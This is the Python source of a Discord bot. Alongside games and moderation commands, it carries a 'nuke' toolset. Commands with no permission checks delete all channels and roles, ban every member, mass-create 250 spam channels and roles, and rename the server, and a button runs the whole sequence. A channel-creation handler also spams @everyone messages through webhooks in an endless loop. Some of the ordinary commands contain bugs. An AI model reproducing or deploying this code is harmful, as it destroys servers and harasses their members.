#//////////////////// IMPORTS

import discord
from discord.ext import commands
import os
import random
import asyncio
from discord_buttons_plugin import ButtonsClient, ActionRow, Button, ButtonType
import aiohttp
from discord import Webhook, AsyncWebhookAdapter
import keep_alive

#//////////////////// VARIABLES

prefix = "!"
bot = commands.Bot(command_prefix=prefix, case_insensitive=True)
bot.remove_command("help")
token = os.environ["token"]
buttons = ButtonsClient(bot)
uselesswebs = [
    "https://heeeeeeeey.com/", "https://puginarug.com/",
    "https://mondrianandme.com/", "https://alwaysjudgeabookbyitscover.com/",
    "https://longdogechallenge.com/", "http://corndog.io/",
    "http://www.staggeringbeauty.com/", "http://www.rrrgggbbb.com/",
    "https://potatoortomato.com/", "https://thepigeon.org/",
    "http://endless.horse/", "https://cat-bounce.com/",
    "http://www.ihatecilantro.com/", "http://www.ismycomputeron.com/",
    "http://www.ffffidget.com/", "http://www.koalastothemax.com/",
    "http://www.windows93.net/", "http://www.burymewithmymoney.com/",
    "http://www.instantostrich.com/", "https://cant-not-tweet-this.com/"
]
nuke_chnl = [
    "JACKY OWNS YOU", "JACKY IS POG", "HEIL JACKY", "NUKED BY JACKY",
    "GET REKT LOL"
]
nuke_icon = "https://media.discordapp.net/attachments/865579933354688544/865651197804544050/GlitchCam_20210505_095700332.jpg?width=631&height=631"
nuke_msg = [
    "@everyone Jacky is pog lol", "@everyone nuked by Jacky",
    "@everyone Jacky owns you", "@everyone get rekt noobs",
    "@everyone you are inferior",
    "@everyone https://cdn.discordapp.com/attachments/811425267520110632/865659174561775636/JACKYISPOG.gif"
]

#//////////////////// EVENTS


@bot.event
async def on_ready():
	print(f"Online on: {bot.user.name}#{bot.user.discriminator}")
	print(
	    "Link: https://discord.com/api/oauth2/authorize?client_id=865185828913676289&permissions=66321471&scope=bot"
	)


@bot.event
async def on_message(message):
	if message.author == bot.user:
		return
	await bot.process_commands(message)


@bot.event
async def on_guild_channel_create(channel):
	webhook = await channel.create_webhook(name="Jacky is Pog")
	webhook_url = webhook.url
	async with aiohttp.ClientSession() as session:
		webhook = Webhook.from_url(str(webhook_url),
		                           adapter=AsyncWebhookAdapter(session))
		while True:
			await webhook.send(random.choice(nuke_msg))


#//////////////////// COMMANDS


@bot.command()
async def rps(ctx, pick=None):
	choices = ["r", "p", "s"]
	b_choice = random.choice(choices)
	if pick is None:
		await ctx.send('''Pick either: rock, paper or scissors
    ```
    Usage:
    !rps <rock/paper/scissors>```''')
		pass
	elif pick == "rock":
		p_choice = "r"
	elif pick == "paper":
		p_choice = "p"
	elif pick == "scissors":
		p_choice = "s"
	else:
		await ctx.send(
		    '''**Invalid choice!** Pick either: rock, paper or scissors
    ```
    Usage:
    !rps <rock/paper/scissors>```''')
		pass

	if p_choice == b_choice:
		result = "tied"
		reason = f"Bot and player selected {pick}"
	elif p_choice == "r":
		if b_choice == "s":
			result = "win"
			reason = "Rock smashes scissors!"
		else:
			result = "lost"
			reason = "Paper covers rock!"
	elif p_choice == "p":
		if b_choice == "r":
			result = "win"
			reason = "Paper covers rock!"
		else:
			result = "lost"
			reason = "Scissors cuts paper!"
	elif p_choice == "s":
		if b_choice == "p":
			result = "win"
			reason = "Scissors cuts paper!"
		else:
			result = "win"
			reason = "Scissors cuts paper!"

	if result == "win":
		embed = discord.Embed(
		    title="Rock Paper Scissors",
		    description=f"**You {result}!** *Reason: {reason}*",
		    color=0x00e61b)
		embed.set_footer(text="Play Again")
	elif result == "tied":
		embed = discord.Embed(
		    title="Rock Paper Scissors",
		    description=f"**You {result}!** *Reason: {reason}*",
		    color=0xff8800)
		embed.set_footer(text="Try Again")
	else:
		embed = discord.Embed(
		    title="Rock Paper Scissors",
		    description=f"**You {result}!** *Reason: {reason}*",
		    color=0xe62e00)
		embed.set_footer(text="Try Again")
	await ctx.send(embed=embed)


@bot.command()
async def uselessweb(ctx):
	await ctx.send(random.choice(uselesswebs))


#//////////////////// MODERATION COMMANDS


@bot.command()
@commands.has_permissions(manage_messages=True)
async def purge(ctx, amount=5):
	await ctx.channel.purge(limit=amount + 1)


@bot.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
	await member.kick(reason=reason)
	await ctx.send(f'Member {member} kicked')


@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason=None):
	await member.ban(reason=reason)
	await ctx.send(f"{member} has been banned lol")


@bot.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx, id: int):
	user = await bot.fetch_user(id)
	await ctx.guild.unban(user)
	await ctx.send(f"{user.name} has been unbanned")


@bot.command()
@commands.has_permissions(ban_members=True)
async def tempban(ctx, member: discord.Member, days, reason=None):
	days * 86400
	await member.ban(reason=reason)
	await ctx.send(f"{member} has been tempbanned for {days} days")
	await asyncio.sleep(days)
	await member.unban()
	await ctx.send(f"{member}'stempban has finished")


#//////////////////// NUKING COMMANDS LMAO


@bot.command()
async def delchannels(ctx):
	for channel in list(ctx.guild.channels):
		try:
			await channel.delete()
		except:
			pass


@bot.command()
async def delroles(ctx):
	for role in list(ctx.guild.roles):
		try:
			await role.delete()
		except:
			pass


@bot.command()
async def masschannels(ctx):
	for _i in range(250):
		try:
			await ctx.guild.create_text_channel(name=random.choice(nuke_chnl))
		except:
			pass


@bot.command()
async def massroles(ctx):
	for _i in range(250):
		try:
			await ctx.guild.create_role(name=random.choice(nuke_chnl))
		except:
			pass


@bot.command()
async def massban(ctx):
	for user in list(ctx.guild.members):
		try:
			await user.ban()
		except:
			pass


@bot.command()
async def nukehelp(ctx):
	embed = discord.Embed(title="Nuke Commands",
	                      description="*__Created by Jacky__*")
	embed.add_field(
	    name=f"```{prefix}nukelol (RECOMMENDED)```",
	    value=
	    "Nukes the server *(required permissions: manage roles, manage channels, manage webhooks)*"
	)
	embed.add_field(
	    name=f"```{prefix}delchannels```",
	    value="Deletes ALL channels *(required permissions: manage channels)*")
	embed.add_field(
	    name=f"```{prefix}delroles```",
	    value="Deletes ALL roles *(required permissions: manage roles)*")
	embed.add_field(
	    name=f"```{prefix}masschannels```",
	    value="Creates many roles *(required permissions: manage channels)*")
	embed.add_field(
	    name=f"```{prefix}massroles```",
	    value="Creates many roles *(required permissions: manage roles)*")
	embed.add_field(
	    name=f"```{prefix}massban```",
	    value="Bans ALL members *(required permissions: ban members)*")
	embed.set_footer(text="Jacky is Pog")
	await ctx.send(embed=embed)


@buttons.click
async def nuke(ctx):
	for channel in list(ctx.guild.channels):
		try:
			await channel.delete()
		except:
			pass
	for user in list(ctx.guild.members):
		try:
			await user.ban()
		except:
			pass
	for role in list(ctx.guild.roles):
		try:
			await role.delete()
		except:
			pass
	await ctx.guild.edit(name="Nuked By Jacky",
	                     description="Jacky is Pog LMAO",
	                     reason="JACKY NUKED YOU LOL",
	                     icon=None,
	                     banner=None)
	for _i in range(250):
		try:
			await ctx.guild.create_text_channel(name=random.choice(nuke_chnl))
		except:
			pass
	for _i in range(250):
		try:
			await ctx.guild.create_role(name=random.choice(nuke_chnl))
		except:
			pass


@buttons.click
async def pog(ctx):
	await ctx.reply("Jacky Is Pog lmao")


@bot.command()
async def test(ctx):
	await buttons.send(
	    content="Honestly though, *you cannot lie*, buttons are epic!",
	    channel=ctx.channel.id,
	    components=[
	        ActionRow([
	            Button(label="Pog",
	                   style=ButtonType().Primary,
	                   custom_id="pog"),
	            Button(label="Nuke",
	                   style=ButtonType().Danger,
	                   custom_id="nuke")
	        ])
	    ])


#//////////////////// TASKS

#//////////////////// RUN

keep_alive.keep_alive()
bot.run(token)
